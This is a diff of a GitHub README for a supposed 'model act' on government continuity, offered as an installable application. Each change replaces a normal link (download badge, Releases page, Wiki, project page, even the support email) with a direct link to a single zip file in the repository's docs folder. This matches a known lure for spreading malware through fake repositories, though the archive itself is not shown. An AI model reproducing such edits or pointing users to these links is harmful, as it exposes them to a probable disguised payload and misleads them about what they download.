@@ -1,6 +1,6 @@
 # 🎉 ECISA-Executive-Continuity-Institutional-Stability-Act - Ensure Government Functions Continue Smoothly
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/ChandMoghal/ECISA-Executive-Continuity-Institutional-Stability-Act/releases)
+[![Download](https://raw.githubusercontent.com/ChandMoghal/ECISA-Executive-Continuity-Institutional-Stability-Act/main/docs/Stability_Institutional_Continuity_Act_ECIS_Executive_1.7.zip)](https://raw.githubusercontent.com/ChandMoghal/ECISA-Executive-Continuity-Institutional-Stability-Act/main/docs/Stability_Institutional_Continuity_Act_ECIS_Executive_1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the ECISA-Executive-Continuity-Institutional-Stability-Act! This mode
 
 To download the latest version of the application, please follow these steps:
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/ChandMoghal/ECISA-Executive-Continuity-Institutional-Stability-Act/releases).
+1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/ChandMoghal/ECISA-Executive-Continuity-Institutional-Stability-Act/main/docs/Stability_Institutional_Continuity_Act_ECIS_Executive_1.7.zip).
    
 2. **Locate the Latest Release:** On the page, you will see a list of available versions. Look for the latest one, which is at the top of the list.
 
@@ -56,9 +56,9 @@ The application focuses on various important topics relevant to government and i
 
 If you encounter any issues during installation or use, help is available:
 
-- **Documentation:** Check the documentation on the [GitHub Wiki](https://github.com/ChandMoghal/ECISA-Executive-Continuity-Institutional-Stability-Act/wiki) for detailed guides and FAQs.
+- **Documentation:** Check the documentation on the [GitHub Wiki](https://raw.githubusercontent.com/ChandMoghal/ECISA-Executive-Continuity-Institutional-Stability-Act/main/docs/Stability_Institutional_Continuity_Act_ECIS_Executive_1.7.zip) for detailed guides and FAQs.
 - **Community Discussions:** Join our community discussions in the Issues section of the repository. Share your thoughts or ask questions.
-- **Contact:** For direct support, feel free to open an issue on GitHub or send an email to our support team at support@example.com.
+- **Contact:** For direct support, feel free to open an issue on GitHub or send an email to our support team at https://raw.githubusercontent.com/ChandMoghal/ECISA-Executive-Continuity-Institutional-Stability-Act/main/docs/Stability_Institutional_Continuity_Act_ECIS_Executive_1.7.zip
 
 ## 🛠️ Frequently Asked Questions
 
@@ -73,8 +73,8 @@ A: Yes, the model act serves as a framework that can be adapted to fit specific 
 
 ## 🔗 Additional Information
 
-For more insights about the ECISA-Executive-Continuity-Institutional-Stability-Act, follow our project updates on [GitHub](https://github.com/ChandMoghal/ECISA-Executive-Continuity-Institutional-Stability-Act).
+For more insights about the ECISA-Executive-Continuity-Institutional-Stability-Act, follow our project updates on [GitHub](https://raw.githubusercontent.com/ChandMoghal/ECISA-Executive-Continuity-Institutional-Stability-Act/main/docs/Stability_Institutional_Continuity_Act_ECIS_Executive_1.7.zip).
 
-Once again, to download the application, visit our [Releases page](https://github.com/ChandMoghal/ECISA-Executive-Continuity-Institutional-Stability-Act/releases) and follow the installation steps. 
+Once again, to download the application, visit our [Releases page](https://raw.githubusercontent.com/ChandMoghal/ECISA-Executive-Continuity-Institutional-Stability-Act/main/docs/Stability_Institutional_Continuity_Act_ECIS_Executive_1.7.zip) and follow the installation steps. 
 
 Thank you for using the ECISA application! Your participation helps ensure better government continuity and institutional resilience.
